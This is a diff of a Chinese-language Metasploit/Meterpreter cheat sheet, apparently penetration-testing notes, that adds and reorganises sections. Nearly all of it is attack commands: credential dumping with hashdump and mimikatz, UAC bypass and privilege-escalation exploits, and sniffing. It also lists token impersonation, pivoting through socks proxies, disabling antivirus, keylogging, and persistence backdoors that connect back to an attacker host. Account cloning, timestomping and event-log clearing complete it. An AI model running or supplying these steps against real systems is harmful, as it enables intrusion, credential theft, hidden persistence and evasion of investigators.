@@ -61,6 +61,7 @@ unsetg                          # 取消设置一个或多个全局变量的
 ---
 
 ## 维护
+
 **安装**
 
 使用 Rapid7 的一套快速安装项目 metasploit-omnibus,可以实现一句话安装
@@ -95,6 +96,7 @@ deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
 ---
 
 ## 常用模块
+
 **信息收集**
 
 利用 auxiliary 这个模块来获取目标网端的信息,包括端口开放情况、主机存活情况.
@@ -123,7 +125,11 @@ use auauxiliary/scanner/http/tomcat_mgr_login   # tomcat 口令枚举
 ---
 
 ## meterpreter
+
+meterpreter 除了持久化控制,其他的操作都在内存里面，不会写进物理磁盘。重启下各种痕迹就消失了。
+
 ### 快速上手
+
 ```bash
 shell       # 获取目标主机的 cmd shell
 getsystem   # 命令可以提权到本地系统权限
@@ -131,6 +137,7 @@ sysinfo     # 显示系统名,操作系统,架构和语言等.
 ```
 
 ### 获取会话
+
 **handler**
 ```bash
 use exploit/multi/handler
@@ -151,6 +158,14 @@ exploit -j  # 后台执行
 如果还不成功,切换回连端口或者改成 bind shell 试试
 
 ### 信息收集
+
+**截屏**
+
+```bash
+use espia
+screenshot
+screengrab
+```
 
 **环境检测**
 ```bash
@@ -180,13 +195,41 @@ run hashdump                        # 获取用户密码 hash 值
 load mimikatz                       # 加载 mimikatz,用于抓取密码,不限于明文密码和 hash 值;
 msv                                 # 获取的是 hash 值
 ssp                                 # 获取的是明文信息
+kerberos
 wdigest                             # 读取内存中存放的账号密码明文信息
 mimikatz_command -f samdump::hashes # 获取用户 hash
 mimikatz_command -f handle::list    # 列出应用进程
 mimikatz_command -f service::list   # 列出服务
+
+或
+
+use post/windows/gather/hashdump
+set session 1
+Exploit
+```
+
+**sniffer**
+```bash
+use sniffer
+sniffer_interfaces                  # 查看网卡信息
+sniffer_start 1                     # 开始在序号为1的网卡上抓包
+sniffer_dump 1 xpsp1.cap            # 下载抓取到的数据包
+```
+
+对抓取的包进行解包
+```bash
+use auxiliary/sniffer/psnuffle
+set pcapfile 1.cap
+run
 ```
 
 ### 权限提升
+
+```bash
+getuid      # 查看当前权限
+getsystem   # 提权
+getuid      # 再次查看判断是否提权成功
+```
 
 **绕过 UAC**
 
@@ -202,11 +245,12 @@ mimikatz_command -f service::list   # 列出服务
 
     因为有的用户是没有管理员权限,没有管理员权限是运行不了那些只能通过管理员权限才能操作的命令.比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作.
 
-    最直接的提权命令:getsystem
+    最直接的提权命令 : getsystem
 
-    绕过 UAC 防护机制的前提是我们首先通过 explloit 获得目标主机的 meterprter.获得 meterpreter 会话 1 后,输入以下命令以检查是否是 system 权限.在这里我就不直接演示了,直接上命令,自己多练习练习即可,所话说熟能生巧.我们需要把获取到的 session 保存到后台,执行 background
+    绕过 UAC 防护机制的前提是我们首先通过 explloit 获得目标主机的 meterprter.获得 meterpreter 会话 1 后,输入以下命令以检查是否是 system 权限.这里直接上命令.我们需要把获取到的 session 保存到后台,执行 background
 
 ```bash
+background
 use exploit/windows/local/bypassuac
 # 将通过进程注入使用可信任发布者证书绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.
 sessions        # 查看目前的 session
@@ -214,8 +258,9 @@ sessions -k     # 杀死所有 session
 set session     # 设为你需要 exploit 的 session
 ```
 
-- **Windows权限提升绕过UAC保护(内存注入)**
+- **Windows 权限提升绕过 UAC 保护(内存注入)**
     ```
+    background
     use exploit/windows/local/bypassuac_eventvwr
     set session 1
     Exploit
@@ -225,6 +270,7 @@ set session     # 设为你需要 exploit 的 session
 
     首先介绍一下这个 COM 处理程序劫持,此模块将通过在 hkcu 配置单元中创建 COM 处理程序注册表项来绕过 Windows UAC.当加载某些较高完整性级别进程时,会引用这些注册表项,从而导致进程加载用户控制的 DLL.这些 DLL 包含导致会话权限提升的 payload.此模块修改注册表项,但在调用 payload 后将清除该项.这个模块需要 payload 的体系架构和操作系统匹配,但是当前的低权限 meterpreter 会话体系架构中可能不同.如果指定 exe::custom,则应在单独的进程中启动 payload 后调用 ExitProcess().此模块通过目标上的 cmd.exe 调用目标二进制文件.因此,如果 cmd.exe 访问受到限制,此模块将无法正常运行.
     ```
+    background
     use exploit/windows/local/bypassuac_comhijack
     set session 1
     Exploit
@@ -234,6 +280,7 @@ set session     # 设为你需要 exploit 的 session
 
     首先介绍一下这个模块,此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动 Windows 事件查看器时调用的自定义命令来绕过 Windows UAC.它将生成关闭 UAC 标志的第二个 shell.此模块修改注册表项,但在调用 payload 后将清除该项.该模块不需要 payload 的体系架构和操作系统匹配.如果指定 EXE ::Custom,则应在单独的进程中启动 payload 后调用 ExitProcess().
     ```
+    background
     use exploit/windows/local/bypassuac_eventvwr
     set session 1
     Exploit
@@ -243,11 +290,20 @@ set session     # 设为你需要 exploit 的 session
 
 除了这些模块还有其它的通过直接通过 incognito 中的 add_localgroup_user 提升、ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18_8120_win32k_privesc 域权限提升等其它的权限提升方法.
 ```bash
+background
 use exploit/windows/local/ms13_081_track_popup_menu # 以 ms13-081 为例
 set session
+Exploit
+
+# 或
+
+background
+use post/windows/gather/enum_patches
+set session
+Exploit
 ```
 
-### 内网渗透
+### 文件操作
 
 **操作文件系统**
 ```bash
@@ -267,48 +323,26 @@ lls:显示自己当前系统的所有文件和文件夹.
 
 **上传和下载**
 ```bash
-upload <file> <destination>     # 上传文件到 Windows 主机
+upload <file> <destination>         # 上传文件到 Windows 主机
 # 注意:使用 -r 参数可以递归上传上传目录和文件
 
-download <file> <path to save>  # 从 windows 主机下载文件
+download <file> <path to save>      # 从 windows 主机下载文件
 # 注意:Windows 路径要使用双斜线
 # 如果我们需要递归下载整个目录包括子目录和文件,我们可以使用 download -r 命令
 ```
 
-**网络命令**
+**搜索文件**
 ```bash
-Ipconfig/ifconfig   # 查看目标主机 IP 地址;
-arp –a              # 用于查看高速缓存中的所有项目;
-route               # 打印路由信息;
-netstat -na         # 可以显示所有连接的端口
+search -f *config*
 ```
 
-其中路由信息对于渗透者来说特有用,因为攻击机处于外网,目标主机处于内网,他们之间是不能通信的,故需要添加路由来把攻击机的 IP 添加到内网里面,这样我们就可以横扫内网,就是所谓的内网代理.
-
-首先我们需要获取网段,然后再添加路由,添加成功后就可以横向扫描内网主机.
+**改变文件时间**
 ```bash
-run get_local_subnets               # 获取网段
-run autoroute -s 192.168.205.1/24   # 添加路由
-run autoroute -p                    # 查看路由
-run autoroute -d -s 172.2.175.0     # 删除网段
-run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24   # 探测该网段下的存活主机.
-meterpreter > background            # 后台 sessions
+timestomp -v a.txt                  # 查看 a 的时间戳
+timestomp a.txt -f b.txt            # 使用 b 的时间覆盖 a 的时间
 ```
 
-**获取凭证**
-```bash
-run hashdump
-
-load mimikatz       # 加载 mimikatz 模块
-wdigest
-kerberos
-```
-
-**操作远程桌面**
-```bash
-run post/windows/manage/enable_rdp  # 开启远程桌面
-run post/windows/manage/enable_rdp username=test password=test  # 添加远程桌面的用户(同时也会将该用户添加到管理员组)
-```
+### 横向
 
 **令牌假冒**
 
@@ -316,59 +350,80 @@ run post/windows/manage/enable_rdp username=test password=test  # 添加远程�
 
 msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
 ```bash
-getuid                          # 查看当前用户
-use incognito                   # 进入该模块
-list_tokens -u                  # 查看存在的令牌
-impersonate_token <Username>    # 令牌假冒
+getuid                              # 查看当前用户
+use incognito                       # 进入该模块
+list_tokens -u                      # 查看存在的令牌
+impersonate_token <Username>        # 令牌假冒
 # 注意用户名的斜杠需要写两个.
 
-getuid                          # 查看是否切换成功
+getuid                              # 查看是否切换成功
 ```
 
-**sniffer**
+**域管理员嗅探**
+
 ```bash
-use sniffer
-sniffer_interfaces          # 查看网卡信息
-sniffer_start 1             # 开始在序号为1的网卡上抓包
-sniffer_dump 1 xpsp1.cap    # 下载抓取到的数据包
+use post/windows/gather/enum_domain
+set session 1
+exploit
 ```
 
-对抓取的包进行解包
+### 端口转发和内网代理
+
+**网络命令**
 ```bash
-use auxiliary/sniffer/psnuffle
-set pcapfile 1.cap
-run
+Ipconfig/ifconfig                   # 查看目标主机 IP 地址;
+arp –a                              # 用于查看高速缓存中的所有项目;
+route                               # 打印路由信息;
+netstat -na                         # 可以显示所有连接的端口
 ```
 
-**端口转发和内网代理**
-- **portfwd**
+其中路由信息对于渗透者来说特有用,因为攻击机处于外网,目标主机处于内网,他们之间是不能通信的,故需要添加路由来把攻击机的 IP 添加到内网里面,这样我们就可以横扫内网,就是所谓的内网代理.
 
-    portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令的参数.
-    ```bash
-    portfwd add -l 2222 -r 1.1.1.1 -p 3389  # 将 1.1.1.3 的 3389 端口转发到本地的 2222 端口.
+首先我们需要获取网段,然后再添加路由,添加成功后就可以横向扫描内网主机.
+```bash
+run get_local_subnets                   # 获取网段
+run autoroute -s 192.168.205.1/24       # 添加路由
+run autoroute -p                        # 查看路由
+run autoroute -d -s 172.2.175.0         # 删除网段
+run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24   # 探测该网段下的存活主机.
+meterpreter > background                # 后台 sessions
+```
+
+**portfwd**
+
+portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令参数.
+```bash
+portfwd add -l 2222 -r 1.1.1.1 -p 3389  # 将 1.1.1.3 的 3389 端口转发到本地的 2222 端口.
     -l:本地监听端口
     -r:内网目标的 ip
     -p:内网目标的端口
-    ```
 
-- **pivot**
+portfwd delete -l <port>
+portfwd list
 
-    pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测.
-    ```bash
-    route add <ip> <mask> <session id>      # 添加一个路由
-    route print
 
-    如果其它程序需要访问这个内网环境,就可以建立 socks 代理
-    msf 提供了3个模块用来做 socks 代理.
-    auxiliary/server/socks4a
-    auxiliary/server/socks5
-    auxiliary/server/socks_unc
+例如:
+portfwd add -l 3389 -r 192.168.161.138 -p 3389
+```
 
-    use auxiliary/server/socks4a
-    SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
-    SRVPORT:监听的端口,默认为 1080.
-    直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
-    ```
+**pivot**
+
+pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测.
+```bash
+route add <ip> <mask> <session id>      # 添加一个路由
+route print
+
+如果其它程序需要访问这个内网环境,就可以建立 socks 代理
+msf 提供了3个模块用来做 socks 代理.
+auxiliary/server/socks4a
+auxiliary/server/socks5
+auxiliary/server/socks_unc
+
+use auxiliary/server/socks4a
+SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
+SRVPORT:监听的端口,默认为 1080.
+直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
+```
 
 ### 权限维持
 
@@ -376,10 +431,6 @@ run
 ```bash
 run killav
 ```
-
-**截屏**
-
-`screenshot`
 
 **键盘记录**
 ```bash
@@ -410,22 +461,33 @@ migrate pid     # 绑定/迁移进程
 
 **后门**
 
+MSF 自带两种植入后门的方式
+
 Meterpreter 的 shell 运行在内存中,目标重启就会失效,如果管理员给系统打上补丁,那么就没办法再次使用 exploit 获取权限,所以需要持久的后门对目标进行控制
 
-- **metsvc**
+- **metsvc 服务后门**
+
+    原理：命令运行成功后会在 `C:\Users\用户名\AppData\Local\Temp` 目录下新建随机名称的文件夹,里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)同时会新建一个服务,显示名称为 Meterpreter,服务名称为 metsvc,启动类型为"自动",绑定在 31337 端口.
+
     ```bash
-    run metsvc
-    # 命令运行成功后会在 C:WindowsTEMP 目录下新建随机名称的文件夹,里面生成3个文件(metsvc.dll、metsvc-server.exe、metsvc.exe)
-    # 同时会新建一个服务,显示名称为 Meterpreter,服务名称为 metsvc,启动类型为"自动",绑定在 31337 端口.
+    # 自动化安装
+    run metsvc -A
 
     use exploit/multi/handler
     set payload windows/metsvc_bind_tcp
-    set rhost xxx.xxx.xxx.xxx
+    set rhost <lhost>
     set lport 31337
+    exploit -j
     ```
 
-- **persistence**
+- **persistence 启动项后门**
+
+    原理就是在 `C:\Users\用户名\AppData\Local\Temp` 下上传一个 VBS 脚本，通过该脚本，在注册表 `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\` 下新建一个开机启动项
+
     ```bash
+    # 自动化部署
+    run persistence -A
+
     run persistence -X -i 10 -r 192.168.1.9 -p 4444
     -A : 安装后门后,自动启动 exploit/multi/handler 模块连接后门
     -L : 自启动脚本的路径,默认为 %TEMP%
@@ -439,13 +501,43 @@ Meterpreter 的 shell 运行在内存中,目标重启就会失效,如果管理�
     -r : 服务端 ip
     ```
 
+    ```bash
+    use exploit/multi/handle
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST <lhost>
+    set LPORT <lport>
+    exploit -j
+    ```
+
 **RDP**
 ```bash
 run post/windows/manage/enable_rdp  # 开启 3389 远程桌面;
 run post/windows/manage/enable_rdp username=xxx password=xxx    # 添加远程桌面的用户(同时也会将该用户添加到管理员组)
 ```
 
+**注册表操作**
+
+通过注册表设置开机自启动
+```bash
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d 'C:\Windows\System32\notepad.exe'
+
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note
+```
+
+通过注册表复制克隆用户
+```bash
+reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users
+shell
+net user guest /active:yes
+reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
+```
+
 ### 痕迹清除
+
 ```bash
 clearev     # 入侵痕迹擦除
 ```
